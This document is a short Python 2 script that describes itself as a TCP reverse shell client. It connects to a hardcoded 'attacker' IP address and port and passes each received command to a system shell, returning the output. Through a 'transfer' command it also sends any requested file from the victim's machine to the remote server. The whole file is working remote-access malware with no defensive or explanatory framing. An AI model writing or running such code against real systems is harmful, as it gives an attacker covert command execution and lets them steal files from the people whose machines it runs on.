'''
This program is to create a TCP reverse shell at the cleint side.
'''


import socket       #Will be used to build a TCP connection with the Server.
import subprocess   #Will be used to create a new shell at the Client side.
import os           #Will be used for file operations.

'''
TransferFile() function will first check if requested file exits, if exits then it will create a loop
where on each iteration 1 KB of data will be read and send to the server. In the end, 'Transferred' keyword
will be send in order to notify the server that it is the end of the file and then file will be closed.
'''
def TransferFile(soc, path):
    if os.path.exists(path):
        f = open(path,'rb')
        traffic = f.read(1024)
        while traffic != '':
            soc.send(traffic)
            traffic = f.read(1024)
        soc.send('Transferred')
        f.close()

    else:
        soc.send('File not found.')

'''
Connection() Function will build a TCP connection and respond to commands send by
the Server (attacker)with appropriate output.
'''
def Connection():

    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Intitiate a socket object.
    soc.connect(('10.110.151.46', 8080))                    #Define attacker's IP address and listening port

   
    while True:

        cmd = soc.recv(1024)                #Keep the TCP session alive.

        if 'terminate' in cmd:              #Close the Socket and break the loop on receiving 'terminate' command'
            soc.close()
            break
        '''
            On receiving 'transfer' command, split the commond into transfer*<File Path>
            and store the file path in path variable and pass it to TransferFile() function
        '''

        elif 'transfer' in cmd:              
            transfer, path = cmd.split('*') 

            try:
             TransferFile(soc, path)

            except Exception, ex:
                 soc.send (str(ex))
                 pass
        elif 'cd' in cmd:
            myCode,myDir = cmd.split(' ')
            os.chdir(myDir)
            soc.send("Current Working Directory is " + os.getcwd())
        
        else:                           #Pass the received command to shell
            CMD = subprocess.Popen(cmd,shell=True,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
            soc.send(CMD.stdout.read()) #Sennd the output to sever.
            soc.send(CMD.stderr.read()) #Send error to server.
            

def main():
    Connection()

main()
       
